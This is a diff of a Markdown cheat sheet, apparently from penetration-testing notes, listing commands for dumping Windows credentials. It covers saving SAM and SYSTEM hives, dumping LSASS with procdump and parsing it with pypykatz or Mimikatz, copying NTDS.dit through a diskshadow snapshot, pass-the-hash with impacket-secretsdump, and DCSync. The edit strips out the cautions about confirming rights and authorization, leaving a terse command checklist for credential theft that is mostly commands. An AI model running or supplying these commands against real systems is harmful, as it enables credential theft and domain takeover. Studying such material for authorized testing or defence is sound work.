@@ -2,11 +2,11 @@
 
 [← Active Directory quick reference](../05-active-directory.md) · [Windows token rights](../windows/token-groups.md) · [Potato](../windows/potato.md)
 
-Confirm local administrator, SYSTEM, backup, debug, or replication rights before a dump. A low-privilege domain login alone does not grant access to SAM, LSASS, or NTDS.
+Match method to rights: local admin/SYSTEM, backup, debug, or replication.
 
 ## Local SAM and LSA
 
-With the right local access, save SAM and SYSTEM for offline parsing:
+Local SAM/SYSTEM:
 
 ```cmd
 reg save HKLM\SAM C:\Temp\sam.save
@@ -21,7 +21,7 @@ impacket-secretsdump -hashes :<nt-hash> '<domain.tld>/<admin-user>@<target-ip>'
 
 ## LSASS and cached material
 
-A confirmed debug or SYSTEM path can inspect LSASS. Keep a dump offline where possible:
+Debug/SYSTEM → LSASS dump for offline parsing:
 
 ```cmd
 procdump -accepteula -ma lsass.exe C:\Temp\lsass.dmp
@@ -31,7 +31,7 @@ procdump -accepteula -ma lsass.exe C:\Temp\lsass.dmp
 pypykatz lsa minidump lsass.dmp
 ```
 
-Mimikatz commands when that tool is the selected method:
+Mimikatz:
 
 ```text
 privilege::debug
@@ -44,7 +44,7 @@ vault::cred
 
 ## DC database or replication
 
-`SeBackupPrivilege` can permit an offline NTDS copy through a volume snapshot. Verify the privilege, snapshot drive, and path before copying:
+`SeBackupPrivilege` → snapshot + offline NTDS:
 
 ```cmd
 diskshadow /s C:\Temp\dsh.txt
@@ -56,10 +56,10 @@ reg save HKLM\SYSTEM C:\Temp\system.save
 impacket-secretsdump -ntds ntds.dit -system system.save LOCAL
 ```
 
-DCSync is a different path and needs directory replication rights:
+DCSync (replication rights):
 
 ```bash
 impacket-secretsdump -just-dc <domain.tld>/<user>:<password>@<dc-ip>
 ```
 
-Use [lateral movement](lateral-movement.md) only after matching the recovered account or NT hash to a reachable service and its authorization.
+Then match account/hash to a reachable service: [lateral movement](lateral-movement.md).
